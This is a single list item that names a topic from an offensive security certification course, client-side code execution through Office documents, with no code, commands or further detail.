- OSEP (PEN-300) — Client-side code execution via Office
